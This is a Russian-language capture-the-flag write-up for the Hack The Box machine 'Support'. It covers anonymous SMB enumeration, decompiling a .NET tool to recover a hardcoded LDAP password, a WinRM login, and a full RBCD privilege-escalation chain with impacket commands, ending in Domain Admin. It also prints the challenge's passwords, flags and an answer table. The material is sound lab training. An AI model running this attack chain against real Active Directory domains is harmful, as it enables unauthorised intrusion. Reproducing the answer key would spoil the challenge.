# Writeup: Hack The Box — Support (Easy, Windows)

## Обзор машины

| Параметр | Значение |
|----------|----------|
| **Имя** | Support |
| **Сложность** | Easy |
| **ОС** | Windows Server 2022 |
| **IP** | 10.129.230.181 |
| **Домен** | support.htb |
| **DC** | dc.support.htb (DC) |

**Цепочка атаки:**
Nmap → SMB anonymous → UserInfo.exe.zip → декомпиляция → LDAP creds → LDAP info field → WinRM → SeMachineAccountPrivilege/GenericAll → RBCD → Domain Admin

---

## Разведка (Nmap)

### 1. Быстрый скан

```bash
nmap -p- -T4 -sC -sV 10.129.230.181 -oN nmap_full.txt
```

**Результат:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-16 15:01:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

**OS:** Microsoft Windows Server 2022 (89%)
**Host:** DC
**Domain:** support.htb

### 2. Что видим из Nmap

| Порт | Сервис | Значение |
|------|--------|----------|
| 53 | DNS | Контроллер домена |
| 88 | Kerberos | Аутентификация AD |
| 135 | MSRPC | RPC-эндпоинт |
| 139/445 | SMB | Шары, enum |
| 389/636 | LDAP/LDAPS | Каталог |
| 464 | kpasswd | Смена паролей Kerberos |
| 593 | RPC over HTTP | RPC через HTTP |
| 3268/3269 | Global Catalog | LDAP глобального каталога |
| **5985** | **WinRM** | **Точка входа для шелла!** |

### 3. Важные детали

- **SMB signing:** `enabled and required` → relay-атаки на SMB не сработают
- **WinRM (5985) открыт** → после получения кред зайдём через `evil-winrm`
- **Домен:** `support.htb`
- **Имя хоста:** `DC`

### 4. Настройка окружения

```bash
# Добавляем хост в /etc/hosts
echo "10.129.230.181 support.htb dc.support.htb" | sudo tee -a /etc/hosts

# Синхронизируем время (важно для Kerberos!)
sudo apt install rdate -y
sudo rdate -n support.htb
```

---

## Task 1: Сколько SMB-шар показывает Support?

**Ответ: 6**

```bash
crackmapexec smb 10.129.230.181 -u 'guest' -p '' --shares
```

```
ADMIN$
C$
IPC$
NETLOGON
support-tools
SYSVOL
```

---

## Task 2: Какая шара НЕ является стандартной для контроллера домена?

**Ответ: support-tools**

Стандартные шары DC: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`. `support-tools` — кастомная.

---

## Task 3: Какой файл в шаре не является публично доступным инструментом?

**Ответ: UserInfo.exe.zip**

Все остальные файлы — известные тулзы (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark). `UserInfo.exe.zip` — кастомная разработка.

---

## Task 4: Какой хардкод-пароль используется для LDAP в UserInfo.exe?

**Ответ: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz**

### Как получили:

**1. Скачали и распаковали:**

```bash
mkdir -p ~/support/userinfo && cd ~/support/userinfo
smbclient //10.129.230.181/support-tools -N -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip
ls -la
```

**2. Нашли строки через strings:**

```bash
strings -e l -n 6 UserInfo.exe | grep -iE "password|enc_|armando|ldap|support"
```

```
armando
LDAP://support.htb
support\ldap
```

**3. Декомпилировали через monodis/dotPeek** и нашли класс `Protected`:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] numArray = Convert.FromBase64String(Protected.enc_password);
    byte[] bytes = numArray;
    for (int index = 0; index < numArray.Length; ++index)
        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);
    return Encoding.Default.GetString(bytes);
}
```

**4. Расшифровали:**

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

decoded = base64.b64decode(enc_password)
cleartext = bytearray()
for i in range(len(decoded)):
    cleartext.append(decoded[i] ^ key[i % len(key)] ^ 223)

print(cleartext.decode())
```

**Результат:**
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## Task 5: Какое поле в LDAP-данных пользователя support содержит пароль?

**Ответ: info**

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(sAMAccountName=support)" | tee ~/support/ldap_support.txt
```

```
info: Ironside47pleasure40Watchful
```

**Итоговые креды:**

| Пользователь | Пароль |
|--------------|--------|
| `support\ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| `support` | `Ironside47pleasure40Watchful` |

---

## Task 6: Какой открытый порт позволяет пользователю из Remote Management Users получить PowerShell-шелл?

**Ответ: 5985**

Порт 5985 — WinRM (Windows Remote Management). Пользователь `support` состоит в группе `Remote Management Users`, что даёт доступ через `evil-winrm`.

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

---

## Task 7: Флаг user.txt

**Ответ: 7c7126f23444e63cdaff5041067c0dc2**

```powershell
type C:\Users\support\Desktop\user.txt
```

Проверка привилегий:

```powershell
whoami /priv
```

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```powershell
whoami /groups
```

```
BUILTIN\Remote Management Users            Alias  S-1-5-32-580
SUPPORT\Shared Support Accounts            Group  S-1-5-21-...-1103
```

---

## Task 8: Какое право BloodHound показывает у support на объекте DC.SUPPORT.HTB?

**Ответ: GenericAll**

Пользователь `support` через группу `Shared Support Accounts` имеет право `GenericAll` на объект `DC.SUPPORT.HTB`. Это позволяет изменять атрибуты контроллера домена, в том числе `msDS-AllowedToActOnBehalfOfOtherIdentity` — основу для RBCD-атаки.

---

## Task 9: Какой атрибут домена задаёт, сколько компьютерных аккаунтов может создать пользователь?

**Ответ: ms-DS-MachineAccountQuota**

По умолчанию равен **10**. Именно это позволяет пользователю `support` (с привилегией `SeMachineAccountPrivilege`) создать фейковый компьютер для RBCD-атаки.

```bash
impacket-addcomputer -computer-name 'julian-PC$' -computer-pass 'Julian123!' \
  -dc-ip 10.129.230.181 SUPPORT.htb/support:'Ironside47pleasure40Watchful'
# [+] Successfully added machine account julian-PC$
```

---

## Task 10: Какой скрипт Impacket конвертирует тикет в ccache?

**Ответ: ticketConverter.py**

Конвертирует Kirbi-тикеты (формат Rubeus/Windows) в ccache (формат Impacket/Linux):

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

---

## Task 11: Какая переменная окружения указывает на ccache-файл для psexec.py -k -no-pass?

**Ответ: KRB5CCNAME**

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
klist
impacket-psexec -k -no-pass SUPPORT.htb/Administrator@dc.support.htb
```

---

## Полная цепочка атаки (RBCD)

### 1. Разведка

```bash
nmap -p- -T4 -sC -sV 10.129.230.181 -oN nmap_full.txt
echo "10.129.230.181 support.htb dc.support.htb" | sudo tee -a /etc/hosts
sudo rdate -n support.htb
```

### 2. SMB enum

```bash
crackmapexec smb 10.129.230.181 -u 'guest' -p '' --shares
crackmapexec smb 10.129.230.181 -u 'guest' -p '' --rid-brute | tee rid_brute.txt
smbclient //10.129.230.181/support-tools -N -c 'ls'
smbclient //10.129.230.181/support-tools -N -c 'get UserInfo.exe.zip'
```

### 3. Декомпиляция и расшифровка

```bash
unzip UserInfo.exe.zip
strings -e l -n 6 UserInfo.exe | grep -iE "password|enc_|armando|ldap"
monodis --output=UserInfo.il UserInfo.exe
grep -B 5 -A 30 "enc_password" UserInfo.il
python3 decrypt.py  # → nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 4. LDAP → пароль support

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(sAMAccountName=support)"
# info: Ironside47pleasure40Watchful
```

### 5. Первичный доступ

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
type C:\Users\support\Desktop\user.txt
whoami /priv   # SeMachineAccountPrivilege Enabled
whoami /groups # Shared Support Accounts, Remote Management Users
```

### 6. RBCD-атака

```bash
# Создаём машинный аккаунт
impacket-addcomputer -computer-name 'julian-PC$' -computer-pass 'Julian123!' \
  -dc-ip 10.129.230.181 SUPPORT.htb/support:'Ironside47pleasure40Watchful'

# Настраиваем RBCD на DC$
impacket-rbcd -delegate-to 'dc$' -delegate-from 'julian-PC$' \
  -dc-ip 10.129.230.181 -action write \
  SUPPORT.htb/support:'Ironside47pleasure40Watchful'

# Получаем сервисный тикет
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip 10.129.230.181 SUPPORT.htb/'julian-PC$':'Julian123!'

# Экспортируем
sudo apt install krb5-user -y
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
klist

# Финальный шелл
impacket-psexec -k -no-pass SUPPORT.htb/Administrator@dc.support.htb
```

### 7. root.txt

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Итоговые флаги

| Флаг | Значение |
|------|----------|
| **user.txt** | `7c7126f23444e63cdaff5041067c0dc2` |
| **root.txt** | `6ed14aeb32a907e915641bb6a9e18b86` |

---

## Сводная таблица ответов

| Task | Ответ |
|------|-------|
| 1 | 6 |
| 2 | support-tools |
| 3 | UserInfo.exe.zip |
| 4 | nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz |
| 5 | info |
| 6 | 5985 |
| 7 | 7c7126f23444e63cdaff5041067c0dc2 |
| 8 | GenericAll |
| 9 | ms-DS-MachineAccountQuota |
| 10 | ticketConverter.py |
| 11 | KRB5CCNAME |

---

## Ключевые выводы

1. **Nmap** — полный скан `-p-` вскрыл все открытые порты, включая WinRM (5985)
2. **Публичные SMB-шары** — всегда проверяй, особенно нестандартные
3. **Декомпиляция .NET** — dotPeek/monodis часто вскрывают хардкод-креды
4. **LDAP-поля** — `info`, `description`, `comment` часто содержат пароли
5. **`whoami /priv`** — простая команда, которая раскрыла `SeMachineAccountPrivilege`
6. **RBCD** — мощная техника эскалации через GenericAll + MachineAccountQuota
7. **Kerberos timing** — синхронизация времени критична (`rdate`/`ntpdate`)
8. **Impacket** — швейцарский нож для AD-атак

Машина отлично тренирует навыки для **PJPT**, **CRTP** и **OSCP**. RBCD — обязательная техника в арсенале AD-пентестера. 🎯
